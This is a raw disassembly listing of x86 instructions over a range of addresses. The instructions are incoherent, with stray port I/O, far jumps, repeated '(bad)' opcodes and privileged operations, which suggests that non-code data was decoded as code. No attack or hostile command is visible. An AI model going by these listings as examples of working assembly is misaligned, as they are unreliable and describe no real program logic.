  429c58:	xor    edi,0x9e00e8a8
  429c5e:	sub    al,0x6b
  429c60:	mov    esi,0x751ce117
  429c65:	daa    
  429c66:	test   al,0xb5
  429c68:	out    0xe1,al
  429c6a:	fidiv  WORD PTR [ebx-0x7087316d]
  429c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429c71:	in     al,0x3c
  429c73:	lock or eax,0x5fe3eec6
  429c79:	daa    
  429c7a:	adc    edx,DWORD PTR [ebx+0x6703735]
  429c80:	mov    WORD PTR [ebx+0x4b47a026],gs
  429c86:	mov    bh,BYTE PTR [eax]
  429c88:	in     al,dx
  429c89:	lods   eax,DWORD PTR ds:[esi]
  429c8a:	loop   0x429c45
  429c8c:	dec    edi
  429c8d:	std    
  429c8e:	lock xor BYTE PTR ss:[edi+0x48612609],bh
  429c96:	mov    DWORD PTR [ecx-0x66d7c6a9],ecx
  429c9c:	les    eax,FWORD PTR [esi]
  429c9e:	ins    BYTE PTR es:[edi],dx
  429c9f:	pop    edi
  429ca0:	out    dx,al
  429ca1:	mov    BYTE PTR [edi-0xc889607],ch
  429ca7:	mov    eax,ds:0x181c644f
  429cac:	loop   0x429c7d
  429cae:	xor    BYTE PTR [ecx-0x57],0x7f
  429cb2:	fistp  QWORD PTR ds:0x7d208f16
  429cb8:	(bad)  
  429cb9:	enter  0x244f,0x88
  429cbd:	in     eax,dx
  429cbe:	dec    esp
  429cbf:	mov    dl,0xde
  429cc1:	ret    0x6ffb
  429cc4:	xchg   esi,eax
  429cc5:	jns    0x429cae
  429cc7:	mov    ch,dl
  429cc9:	(bad)  
  429cca:	push   ebx
  429ccb:	mov    al,ds:0x5bf5eab6
  429cd0:	dec    ebp
  429cd1:	pop    esi
  429cd2:	xor    eax,0x37a20c2b
  429cd7:	dec    ecx
  429cd8:	inc    esp
  429cd9:	or     DWORD PTR [eax+0x22],esp
  429cdc:	cmp    BYTE PTR [ecx-0x76fe7451],bh
  429ce2:	sub    DWORD PTR [edi+0x78b6fe74],0x83082782
  429cec:	retf   
  429ced:	lea    edi,[esi-0x61]
  429cf0:	inc    ebx
  429cf1:	je     0x429c9a
  429cf3:	les    esi,FWORD PTR [ecx-0x42]
  429cf6:	push   ebp
  429cf7:	push   eax
  429cf8:	push   0x5680f0ff
  429cfd:	test   al,0x39
  429cff:	dec    eax
  429d00:	not    dl
  429d02:	sbb    ah,BYTE PTR [edx]
  429d04:	fnstsw WORD PTR [eax-0x43ebdb1c]
  429d0a:	scas   al,BYTE PTR es:[edi]
  429d0b:	jp     0x429d04
  429d0d:	shl    BYTE PTR es:[esi+edi*2-0x34],1
  429d12:	vmptrld QWORD PTR [edi-0x5acf3e20]
  429d19:	dec    edi
  429d1a:	call   0x77a0:0x5fadf49b
  429d21:	nop
  429d22:	shr    DWORD PTR [ebp+esi*2-0x6fa3694d],cl
  429d29:	lahf   
  429d2a:	mul    DWORD PTR [edi+ecx*2+0x2b]
  429d2e:	and    al,ch
  429d30:	sar    BYTE PTR [edx],1
  429d32:	popf   
  429d33:	jmp    0x429d65
	...
  429d95:	add    BYTE PTR [ebx-0x13f33b49],bl
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0xf6d8dc
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	test   al,0x23
  429db0:	jae    0x429dec
  429db2:	sbb    esi,edi
  429db4:	inc    ebp
  429db5:	or     al,0x50
  429db7:	fcom   QWORD PTR ds:0x9c639609
  429dbd:	jmp    0xa8e6:0xd8acf850
  429dc4:	shl    BYTE PTR [eax-0x1d],cl
  429dc7:	std    
  429dc8:	xchg   ecx,eax
  429dc9:	xchg   edx,eax
  429dca:	push   ebx
  429dcb:	sbb    ebx,DWORD PTR [edi-0x2831b013]
  429dd1:	or     DWORD PTR [esi],0xffffffff
  429dd4:	mov    esp,0xb8aaf15b
  429dd9:	retf   0x5d0b
  429ddc:	xchg   ebp,eax
  429ddd:	cmp    BYTE PTR [ebp+0xdead5e9],ch
  429de3:	xchg   edx,eax
  429de4:	cmp    BYTE PTR ds:0x1ba0e1de,ch
  429dea:	xor    ecx,DWORD PTR [esi-0x589fbc9d]
  429df0:	mov    ebx,0x833979f4
  429df5:	sub    DWORD PTR [eax+0x6b0d6bb1],edi
  429dfb:	pop    esp
  429dfc:	ins    DWORD PTR es:[edi],dx
  429dfd:	repz mov dh,0x49
  429e00:	adc    edx,DWORD PTR [ebx+0x0]
  429e03:	xlat   BYTE PTR ds:[ebx]
  429e04:	pushf  
  429e05:	out    dx,al
  429e06:	scas   al,BYTE PTR es:[edi]
  429e07:	icebp  
  429e08:	test   BYTE PTR [esi-0x2920a748],cl
  429e0e:	ja     0x429e8a
  429e10:	sbb    al,0xcc
  429e12:	adc    eax,0x7362640f
  429e17:	dec    ebx
  429e18:	mov    ch,0xdb
  429e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429e1b:	clc    
  429e1c:	xchg   BYTE PTR [edx+0x1580f68e],cl
  429e22:	sbb    edi,edi
  429e24:	icebp  
  429e25:	in     al,dx
  429e26:	dec    edx
  429e27:	xchg   ecx,eax
  429e28:	mov    ecx,0x3ab702
  429e2d:	push   cs
  429e2e:	jp     0x429dd8
  429e30:	xor    BYTE PTR ds:0x8bc3e6ad,dh
  429e36:	popf   
  429e37:	retf   
  429e38:	xor    BYTE PTR [edi+0x17],0x1e
  429e3c:	out    dx,al
  429e3d:	retf   
  429e3e:	mov    ds:0xfb3cbb34,al
  429e43:	loope  0x429e4d
  429e45:	or     DWORD PTR [esi-0x3360d86e],edi
  429e4b:	jbe    0x429e6f
  429e4d:	dec    edx
  429e4e:	call   0xea76:0xfdfcfff7
  429e55:	dec    esp
  429e56:	and    eax,0xe96d3a0d
  429e5b:	xor    edi,DWORD PTR [esi]
  429e5d:	outs   dx,DWORD PTR ds:[esi]
  429e5e:	retf   
  429e5f:	fcom   DWORD PTR [edx+0x4b2536fb]
  429e65:	inc    edx
  429e66:	ins    DWORD PTR es:[edi],dx
  429e67:	(bad)  
  429e68:	sbb    eax,0xbda0222b
  429e6d:	jmp    0x429eb2
  429e6f:	inc    ebp
  429e70:	xchg   esi,eax
  429e71:	push   es
  429e72:	pop    ecx
  429e73:	setne  BYTE PTR [eax+0x5e6cb40c]
  429e7a:	xor    al,0x8e
  429e7c:	mov    ds:0xa11961ca,eax
  429e81:	dec    edi
  429e82:	arpl   WORD PTR [ebx],di
  429e84:	push   es
  429e85:	out    0xd,eax
  429e87:	neg    DWORD PTR [edi-0x7e]
  429e8a:	and    bh,dl
  429e8c:	jecxz  0x429e89
  429e8e:	cli    
  429e8f:	es nop
  429e91:	pop    ebx
  429e92:	nop
  429e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e94:	sbb    eax,0x83158b1f
  429e99:	ins    BYTE PTR es:[edi],dx
  429e9a:	repz je 0x429e50
  429e9d:	add    DWORD PTR [eax+0x367eb2b2],edi
  429ea3:	rol    DWORD PTR [edi],1
  429ea5:	iret   
  429ea6:	xchg   DWORD PTR [ecx+edi*4-0x2090798],esp
  429ead:	mov    ebx,0x5ba0dace
  429eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429eb3:	adc    ecx,ebx
	...
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0xc89d0010
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    BYTE PTR [esp+ecx*1-0x4bc8e6a4],bl
  429f34:	stos   BYTE PTR es:[edi],al
  429f35:	fwait
  429f36:	in     eax,0x1
  429f38:	call   0x2463:0x744566c0
  429f3f:	xchg   edi,edx
  429f41:	in     eax,0x7d
  429f43:	mov    ch,bl
  429f45:	fistp  DWORD PTR [ecx+0x57]
  429f48:	ret    
  429f49:	xchg   ebx,eax
  429f4a:	std    
  429f4b:	inc    ebp
  429f4c:	loop   0x429f12
  429f4e:	and    bl,BYTE PTR [edx-0x1f7855c3]
  429f54:	jmp    0x429ef9
  429f56:	pop    es
  429f57:	mov    ah,0xb0
  429f59:	aas    
  429f5a:	push   ds
  429f5b:	icebp  
  429f5c:	mov    esp,edx
  429f5e:	rcl    bl,cl
  429f60:	mov    esp,0x766c74
  429f65:	ds inc ecx
  429f67:	dec    eax
  429f68:	lds    esp,FWORD PTR [ebp-0x2139a321]
  429f6e:	jb     0x429fb6
  429f70:	and    ch,bl
  429f72:	out    0x80,eax
  429f74:	xchg   edx,eax
  429f75:	test   eax,0x93452c94
  429f7a:	rcr    DWORD PTR [esi-0x6b637ab7],1
  429f80:	sbb    eax,0x67d8b798
  429f85:	and    ah,BYTE PTR [ebx]
  429f87:	mov    dl,0xb6
  429f89:	mov    ecx,DWORD PTR [ebp-0x26ce3987]
  429f8f:	arpl   WORD PTR [ecx+0x29f61434],si
  429f95:	enter  0x5a76,0xba
  429f99:	(bad)  
  429f9a:	cmp    BYTE PTR [ebx],dh
  429f9c:	add    eax,0x17294774
  429fa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429fa2:	js     0x429fbf
  429fa4:	mov    eax,0x592e9ff0
  429fa9:	cmp    al,0xe
  429fab:	push   esp
  429fac:	mov    ebp,0x36444c69
  429fb1:	sahf   
  429fb2:	inc    ebp
  429fb3:	xchg   ecx,eax
  429fb4:	aaa    
  429fb5:	adc    eax,0xec747c13
  429fba:	std    
  429fbb:	add    DWORD PTR [ebp+0x55],ebp
  429fbe:	(bad)  
  429fbf:	or     ebp,edx
  429fc1:	bound  ebx,QWORD PTR [edx-0x1e]
  429fc4:	and    bl,BYTE PTR [ebp-0x17]
  429fc7:	xor    dh,0x8a
  429fca:	pop    ecx
  429fcb:	js     0x429f7b
  429fcd:	xor    DWORD PTR [eax+ebx*1-0x3e],ebp
  429fd1:	fiadd  DWORD PTR [edx+0x32]
  429fd4:	mov    esp,0xafc59370
  429fd9:	sahf   
  429fda:	lds    ebx,FWORD PTR [esi+edi*8]
  429fdd:	xchg   edx,eax
  429fde:	cdq    
  429fdf:	imul   edi,DWORD PTR [eax+0x749eaa54],0xdf50b26a
  429fe9:	mov    edx,0xf3ac26ff
  429fee:	mov    edx,0x6d7f722d
  429ff3:	push   edx
  429ff4:	xor    al,0x68
  429ff6:	mov    ah,0xe2
  429ff8:	mov    eax,0xfa08e020
  429ffd:	aaa    
  429ffe:	xor    DWORD PTR [ebx-0x3a],eax
  42a001:	test   BYTE PTR [esi-0x62],dh
  42a004:	xor    al,0xc0
  42a006:	cmp    DWORD PTR [eax],0x44f020bd
  42a00c:	sbb    eax,ecx
  42a00e:	add    BYTE PTR [esi+eiz*1+0x3c],bh
  42a012:	xor    ebx,DWORD PTR [ecx]
  42a014:	sbb    al,0x89
  42a016:	pop    eax
  42a017:	pop    edi
  42a018:	adc    DWORD PTR [eax-0x3f],ecx
  42a01b:	inc    ecx
  42a01c:	or     ebx,0xffffffb9
  42a01f:	xchg   al,ah
  42a021:	fsub   DWORD PTR [esi-0x311a4b6]
  42a027:	stc    
  42a028:	bound  esi,QWORD PTR [edi+0x54927355]
  42a02e:	sbb    BYTE PTR ds:0xf58f7ff5,0x38
	...
  42a095:	add    bh,dl
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0xff78ee4e
  42a0a5:	imul   esp,DWORD PTR [ecx-0x3f],0x1
  42a0a9:	add    BYTE PTR [edi],al
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [edx+eiz*4-0x25],ch
  42a0b1:	dec    eax
  42a0b2:	popa   
  42a0b3:	pop    es
  42a0b4:	ja     0x42a0b2
  42a0b6:	shl    bh,0x24
  42a0b9:	or     al,0xa4
  42a0bb:	mov    al,ds:0x707aa9a3
  42a0c0:	(bad)  
  42a0c1:	mov    dh,0x66
  42a0c3:	xor    al,0xdf
  42a0c5:	imul   edx,DWORD PTR [eax-0x5d],0x4c
  42a0c9:	out    dx,eax
  42a0ca:	fcmovnu st,st(3)
  42a0cc:	ins    DWORD PTR es:[edi],dx
  42a0cd:	jmp    0x806a:0x6937ffcb
  42a0d4:	call   0x495:0xfc542d76
  42a0db:	cmp    esi,DWORD PTR [eax]
  42a0dd:	xor    cl,dh
  42a0df:	ins    DWORD PTR es:[edi],dx
  42a0e0:	lds    edi,FWORD PTR [ebx+esi*8+0x39]
  42a0e4:	mov    edi,0x66a3ca8b
  42a0e9:	sti    
  42a0ea:	aaa    
  42a0eb:	out    dx,al
  42a0ec:	stos   BYTE PTR es:[edi],al
  42a0ed:	xchg   esi,eax
  42a0ee:	push   ecx
  42a0ef:	xchg   edi,eax
  42a0f0:	dec    esp
  42a0f1:	cmc    
  42a0f2:	outs   dx,DWORD PTR ds:[esi]
  42a0f3:	xchg   esp,eax
  42a0f4:	cmp    al,0x3e
  42a0f6:	loopne 0x42a0ff
  42a0f8:	mov    ecx,0x3ded15a2
  42a0fd:	fisub  DWORD PTR [ebx-0x24]
  42a100:	jbe    0x42a0d6
  42a102:	pop    ds
  42a103:	mov    esp,0x6fbe3778
  42a108:	mov    dh,0x89
  42a10a:	adc    eax,0xb234937f
  42a10f:	outs   dx,DWORD PTR ds:[esi]
  42a110:	pop    edx
  42a111:	add    al,0x2
  42a113:	cwde   
  42a114:	nop
  42a115:	rcl    BYTE PTR [edx],0xde
  42a118:	mov    eax,0x70631090
  42a11d:	out    0x98,al
  42a11f:	dec    eax
  42a120:	push   0x26
  42a122:	scas   eax,DWORD PTR es:[edi]
  42a123:	test   BYTE PTR [edx+0x29],ch
  42a126:	dec    esp
  42a127:	mov    ds:0x7ce8bc83,eax
  42a12c:	xor    eax,esi
  42a12e:	repnz aaa 
  42a130:	push   ss
  42a131:	in     al,dx
  42a132:	push   es
  42a133:	lods   al,BYTE PTR ds:[esi]
  42a134:	jb     0x42a1b3
  42a136:	and    ebx,DWORD PTR [ebp+0x7a46d5a3]
  42a13c:	fist   WORD PTR [edx+0x67]
  42a13f:	pop    esp
  42a140:	arpl   WORD PTR [ebx+0x481f30b3],si
  42a146:	out    0xec,al
  42a148:	xor    BYTE PTR [edx+0x42],cl
  42a14b:	cmp    BYTE PTR [esi+0x6fcca033],0x6f
  42a152:	loop   0x42a124
  42a154:	lods   al,BYTE PTR ds:[esi]
  42a155:	jne    0x42a1a7
  42a157:	jmp    0x3c2b:0x96521457
  42a15e:	mov    al,ds:0xddf79dec
  42a163:	jne    0x42a16f
  42a165:	dec    esp
  42a166:	and    eax,edi
  42a168:	add    cl,0xff
  42a16b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a16c:	add    eax,0xb02c3d61
  42a171:	xchg   esi,eax
  42a172:	mov    eax,ds:0x7cf5c9c8
  42a177:	push   edx
  42a178:	mov    esi,0x9caa2904
  42a17d:	xor    al,0x7d
  42a17f:	mov    eax,0xec153959
  42a184:	sub    dl,dl
  42a186:	repnz sub DWORD PTR [esi],ecx
  42a189:	adc    edi,DWORD PTR [ebx+0x61]
  42a18c:	mov    eax,ds:0x6676b827
  42a191:	outs   dx,DWORD PTR ds:[esi]
  42a192:	sbb    eax,0xe72f2e77
  42a197:	or     al,0x91
  42a199:	mov    ds:0xba82a194,eax
  42a19e:	fld    QWORD PTR [esi+0x48c0be21]
  42a1a4:	mov    ebp,0x2cd188b5
  42a1a9:	inc    edx
  42a1aa:	out    dx,eax
  42a1ab:	xor    esi,edi
  42a1ad:	add    DWORD PTR [edx-0x7b],ebx
  42a1b0:	bound  ebp,QWORD PTR [edx+0x1e]
  42a1b3:	xor    edi,edi
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   edx,DWORD PTR [ebp+0x63],0xc26809c9
  42a228:	add    DWORD PTR [eax],eax
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    BYTE PTR [esi],dh
  42a22f:	or     DWORD PTR cs:[ebx+0x26],esp
  42a233:	xchg   ebp,eax
  42a234:	push   ds
  42a235:	adc    BYTE PTR [esi],dh
  42a237:	xchg   esp,eax
  42a238:	or     DWORD PTR [ebx],ebx
  42a23a:	ja     0x42a247
  42a23c:	mov    ecx,0x106608a7
  42a241:	mov    bh,0x6c
  42a243:	cld    
  42a244:	adc    al,0x95
  42a246:	stc    
  42a247:	cmp    ah,BYTE PTR [ecx+edi*1-0x3460744b]
  42a24e:	jmp    0x600eb59e
  42a253:	push   cs
  42a254:	jmp    0x42a24f
  42a256:	inc    esp
  42a257:	xchg   ecx,eax
  42a258:	fwait
  42a259:	sub    dh,bh
  42a25b:	shl    BYTE PTR [edi+0x1295d093],0xb1
  42a262:	imul   ebp,DWORD PTR [esi],0xffffffbf
  42a265:	mov    ?,WORD PTR [ecx+0x42a3b956]
  42a26b:	jo     0x42a221
  42a26d:	std    
  42a26e:	(bad)  
  42a26f:	xchg   edx,eax
  42a270:	mov    dh,0xbb
  42a272:	fnstcw WORD PTR [edi]
  42a274:	ret    
  42a275:	jl     0x42a29f
  42a277:	mov    eax,0xd75ead21
  42a27c:	sub    eax,esi
  42a27e:	sub    DWORD PTR [edx],edx
  42a280:	test   eax,0xaa2ffa8e
  42a285:	or     eax,0xee4e5b8
  42a28a:	lahf   
  42a28b:	xor    BYTE PTR [edi],bl
  42a28d:	push   edx
  42a28e:	mov    ds:0x5d35bd40,al
  42a293:	jno    0x42a29f
  42a295:	es enter 0x9788,0x3b
  42a29a:	push   ss
  42a29b:	pop    ebp
  42a29c:	push   ecx
  42a29d:	xchg   esp,eax
  42a29e:	sbb    eax,0xa11b3433
  42a2a3:	xor    dl,BYTE PTR [edx+0x3f7c22b5]
  42a2a9:	call   0x631c:0x82432f66
  42a2b0:	mov    ds,ecx
  42a2b2:	push   ebp
  42a2b3:	and    DWORD PTR [esi-0x27],0x2d
  42a2b7:	leave  
  42a2b8:	(bad)  
  42a2b9:	repnz mov ebx,0xe8d31da2
  42a2bf:	cmp    eax,0xb342f88e
  42a2c4:	inc    eax
  42a2c5:	outs   dx,DWORD PTR ds:[esi]
  42a2c6:	sub    DWORD PTR [ecx-0x5c92d7ce],ebx
  42a2cc:	push   esp
  42a2cd:	loope  0x42a2cb
  42a2cf:	inc    ecx
  42a2d0:	mov    dh,0xf0
  42a2d2:	aam    0x51
  42a2d4:	dec    edx
  42a2d5:	adc    cl,BYTE PTR [esi+0x65]
  42a2d8:	shl    DWORD PTR [eax+0x4be7008c],0x5
  42a2df:	std    
  42a2e0:	xchg   edi,eax
  42a2e1:	repz jbe 0x42a29f
  42a2e4:	loopne 0x42a2fa
  42a2e6:	xor    ebx,DWORD PTR [esi-0xa]
  42a2e9:	xchg   esi,eax
  42a2ea:	shl    BYTE PTR [eax+0x7],cl
  42a2ed:	lods   al,BYTE PTR ds:[esi]
  42a2ee:	dec    edx
  42a2ef:	std    
  42a2f0:	adc    edi,DWORD PTR [ebp+0x668be573]
  42a2f6:	inc    eax
  42a2f7:	imul   ecx,DWORD PTR [edi],0x4f266592
  42a2fd:	cmp    eax,0x894ed76f
  42a302:	pop    esp
  42a303:	lahf   
  42a304:	and    ebp,esi
  42a306:	cmc    
  42a307:	xor    edx,DWORD PTR [ecx]
  42a309:	test   DWORD PTR [ebp-0x632cd05a],ebp
  42a30f:	cmp    DWORD PTR [esi],edi
  42a311:	in     al,0x5c
  42a313:	cld    
  42a314:	inc    edi
  42a315:	dec    edi
  42a316:	inc    eax
  42a317:	xchg   esp,eax
  42a318:	cs lahf 
  42a31a:	or     BYTE PTR [ebx+0x37],0x49
  42a31e:	xlat   BYTE PTR ds:[ebx]
  42a31f:	fist   WORD PTR [ebp-0x4e]
  42a322:	push   0x5e
  42a324:	ror    DWORD PTR [esi-0xe],cl
  42a327:	add    BYTE PTR [eax],ah
  42a329:	sub    esp,esi
  42a32b:	mov    edi,0x68c25803
  42a330:	pop    eax
  42a331:	push   ebp
  42a332:	in     eax,dx
  42a333:	repnz cli 
	...
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0x15ab
  42a3a4:	je     0x42a32d
  42a3a6:	outs   dx,DWORD PTR ds:[esi]
  42a3a7:	ret    
  42a3a8:	add    DWORD PTR [eax],eax
  42a3aa:	pop    es
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [edi],ch
  42a3af:	idiv   BYTE PTR [edi+0x4f4be1b8]
  42a3b5:	jb     0x42a40b
  42a3b7:	mov    WORD PTR [edi+0x1d393ae8],es
  42a3bd:	retf   0x4775
  42a3c0:	xor    ch,BYTE PTR [esi+0x8]
  42a3c3:	shl    DWORD PTR [esi-0x76],cl
  42a3c6:	shr    dl,1
  42a3c8:	mov    edi,0x1768932
  42a3cd:	sub    ch,BYTE PTR [eax+0x11]
  42a3d0:	in     al,0x6f
  42a3d2:	shl    BYTE PTR [ebx+0x7d8f8abf],0xb5
  42a3d9:	sub    eax,0x211d7c63
  42a3de:	int    0x3c
  42a3e0:	out    dx,eax
  42a3e1:	sbb    eax,0xfb8f0e80
  42a3e6:	mov    al,ds:0xc563c830
  42a3eb:	inc    edi
  42a3ec:	lahf   
  42a3ed:	mov    ecx,DWORD PTR gs:[esi-0xd]
  42a3f1:	cmp    al,0x8f
  42a3f3:	push   0xffffff83
  42a3f5:	mov    esi,0xe4ba1a47
  42a3fa:	dec    ecx
  42a3fb:	imul   ecx,eax,0xffffffc1
  42a3fe:	mov    ds:0xf586b0a3,eax
  42a403:	into   
  42a404:	out    0x49,al
  42a406:	pop    esp
  42a407:	(bad)  
  42a408:	jb     0x42a429
  42a40a:	dec    edi
  42a40b:	mov    ecx,0xcd8ba433
  42a410:	into   
  42a411:	push   ebp
  42a412:	xchg   ah,dh
  42a414:	les    edi,FWORD PTR [ebx-0x116536ea]
  42a41a:	addr16 jno 0x42a484
  42a41d:	dec    ecx
  42a41e:	push   esi
  42a41f:	test   eax,0xdbf58105
  42a424:	stos   BYTE PTR es:[edi],al
  42a425:	add    eax,DWORD PTR [ebx+0x54082a15]
  42a42b:	not    BYTE PTR [ebx]
  42a42d:	outs   dx,BYTE PTR ds:[esi]
  42a42e:	call   0x7677:0xa32ab917
  42a435:	popa   
  42a436:	mov    bl,bh
  42a438:	mov    ebp,0x49efc382
  42a43d:	jbe    0x42a49c
  42a43f:	out    dx,eax
  42a440:	gs ret 0xf963
  42a444:	inc    ebp
  42a445:	mov    eax,ds:0x13d23639
  42a44a:	cmp    al,0xbd
  42a44c:	push   cs
  42a44d:	jno    0x42a3f0
  42a44f:	out    dx,eax
  42a450:	lods   al,BYTE PTR ds:[esi]
  42a451:	outs   dx,DWORD PTR ds:[esi]
  42a452:	shr    BYTE PTR [eax-0x2e0c75ab],cl
  42a458:	jo     0x42a4ca
  42a45a:	rcr    DWORD PTR [ecx+0x7441f5f8],0xed
  42a461:	stc    
  42a462:	cmc    
  42a463:	(bad)  
  42a464:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42a466:	aad    0xeb
  42a468:	ret    
  42a469:	adc    cl,BYTE PTR ds:0xa71d104f
  42a46f:	pop    ss
  42a470:	push   es
  42a471:	rol    DWORD PTR [ebp+0x2b],0x57
  42a475:	sub    dh,BYTE PTR [ebx+0x23]
  42a478:	jno    0x42a42a
  42a47a:	sti    
  42a47b:	sub    cl,dh
  42a47d:	pop    ebx
  42a47e:	loopne 0x42a440
  42a480:	in     eax,0x25
  42a482:	xlat   BYTE PTR ds:[ebx]
  42a483:	out    dx,eax
  42a484:	(bad)  
  42a485:	xor    DWORD PTR [ecx],edx
  42a487:	xor    BYTE PTR [edx],dl
  42a489:	push   ebp
  42a48a:	ret    
  42a48b:	sbb    al,0x29
  42a48d:	push   ss
  42a48e:	clc    
  42a48f:	aas    
  42a490:	and    dl,BYTE PTR [ecx+eiz*8]
  42a493:	rol    DWORD PTR [edx-0x7babbab0],0xf6
  42a49a:	pop    esi
  42a49b:	(bad)  
  42a49c:	mov    edi,0x120ee20f
  42a4a1:	adc    dl,BYTE PTR [edx+0x79]
  42a4a4:	jg     0x42a44e
  42a4a6:	jae    0x42a49a
  42a4a8:	push   esp
  42a4a9:	sub    bh,BYTE PTR [ebx+ecx*8-0x64184890]
  42a4b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a4b1:	outs   dx,BYTE PTR ds:[esi]
  42a4b2:	or     bl,BYTE PTR [ecx+0x34]
	...
  42a514:	add    BYTE PTR [eax],al
  42a516:	sbb    BYTE PTR [edi+0x17],cl
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    ch,BYTE PTR [ebp-0x40]
  42a524:	aad    0x7a
  42a526:	jbe    0x42a4ec
  42a528:	add    DWORD PTR [eax],eax
  42a52a:	pop    es
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [edi-0x55],dh
  42a530:	es inc ebx
  42a532:	ds jns 0x42a531
  42a535:	pushf  
  42a536:	mov    ch,0x99
  42a538:	jge    0x42a566
  42a53a:	dec    ebx
  42a53b:	ror    DWORD PTR [ecx+0x32],1
  42a53e:	adc    al,0xae
  42a540:	push   eax
  42a541:	pop    ecx
  42a542:	xchg   esi,eax
  42a543:	add    al,bh
  42a545:	push   edi
  42a546:	cli    
  42a547:	or     esi,DWORD PTR [ebp+0x4d]
  42a54a:	cld    
  42a54b:	ja     0x42a50b
  42a54d:	mov    ebp,DWORD PTR [eax+0x58]
  42a550:	rcl    BYTE PTR [eax],cl
  42a552:	test   edx,esp
  42a554:	xchg   BYTE PTR [ebx+0x2df3ac47],dh
  42a55a:	add    DWORD PTR [edi+0x58],edi
  42a55d:	dec    ebx
  42a55e:	cli    
  42a55f:	out    dx,eax
  42a560:	xchg   esp,eax
  42a561:	inc    ebp
  42a562:	jmp    0x42a53b
  42a564:	push   ecx
  42a565:	sub    al,0xde
  42a567:	push   ss
  42a568:	xchg   esp,eax
  42a569:	sbb    eax,0x91f31e3
  42a56e:	lock pop esp
  42a570:	pop    ss
  42a571:	lock push ebp
  42a573:	iret   
  42a574:	push   edi
  42a575:	adc    al,0x31
  42a577:	ror    BYTE PTR [edx-0x70],cl
  42a57a:	rcl    BYTE PTR [ebx],cl
  42a57c:	add    ch,al
  42a57e:	cmp    DWORD PTR [edx+eiz*8-0x73],ebx
  42a582:	add    eax,0xab9d935b
  42a587:	add    al,0x1a
  42a589:	out    0x95,eax
  42a58b:	jle    0x42a53c
  42a58d:	sbb    eax,0x5d70c385
  42a592:	inc    esi
  42a593:	or     cl,BYTE PTR [eax+0x6b]
  42a596:	xor    al,0xb8
  42a598:	adc    BYTE PTR [esi-0x6],bl
  42a59b:	ja     0x42a533
  42a59d:	inc    ebx
  42a59e:	jbe    0x42a5bf
  42a5a0:	lock (bad) 
  42a5a2:	repnz fld QWORD PTR [edx+0x1d19fac]
  42a5a9:	(bad)  
  42a5aa:	imul   ecx,DWORD PTR [edi],0xcbf749e1
  42a5b0:	mov    esi,0xaee9476d
  42a5b5:	push   es
  42a5b6:	jmp    0x6c72:0x2150a129
  42a5bd:	push   eax
  42a5be:	sub    eax,0x8a00d43d
  42a5c3:	out    0xb3,eax
  42a5c5:	pop    edi
  42a5c6:	mov    dl,BYTE PTR [edx]
  42a5c8:	pop    ecx
  42a5c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5ca:	bound  edi,QWORD PTR [ecx]
  42a5cc:	pop    edi
  42a5cd:	les    ebx,FWORD PTR [edx]
  42a5cf:	sub    bl,al
  42a5d1:	cwde   
  42a5d2:	inc    edi
  42a5d3:	std    
  42a5d4:	cli    
  42a5d5:	xor    al,0x32
  42a5d7:	cmp    dl,al
  42a5d9:	cmp    bl,bl
  42a5db:	in     al,dx
  42a5dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a5dd:	ins    DWORD PTR es:[edi],dx
  42a5de:	mov    ah,0x2d
  42a5e0:	retf   
  42a5e1:	xchg   ecx,eax
  42a5e2:	imul   eax,DWORD PTR [edx+edx*1],0x1751827d
  42a5e9:	push   0x69af9c41
  42a5ee:	pop    esp
  42a5ef:	or     eax,DWORD PTR [ecx-0x7dbb8328]
  42a5f5:	and    al,0x34
  42a5f7:	jg     0x42a609
  42a5f9:	aaa    
  42a5fa:	cld    
  42a5fb:	test   eax,0x522319de
  42a600:	and    ecx,DWORD PTR [esp+eax*2]
  42a603:	and    eax,0x1c9933bd
  42a608:	dec    eax
  42a609:	xchg   esi,eax
  42a60a:	xor    BYTE PTR [edx-0x1],0x3
  42a60e:	sub    DWORD PTR [eax-0x71],0xffffffd5
  42a612:	ins    DWORD PTR es:[edi],dx
  42a613:	xlat   BYTE PTR ds:[ebx]
  42a614:	jnp    0x42a5ce
  42a616:	call   0xc3e78560
  42a61b:	xchg   ebp,eax
  42a61c:	xchg   ecx,eax
  42a61d:	pop    es
  42a61e:	pop    esi
  42a61f:	adc    dl,bl
  42a621:	pushf  
  42a622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a623:	or     esp,ebp
  42a625:	inc    esp
  42a626:	pop    ds
  42a627:	cld    
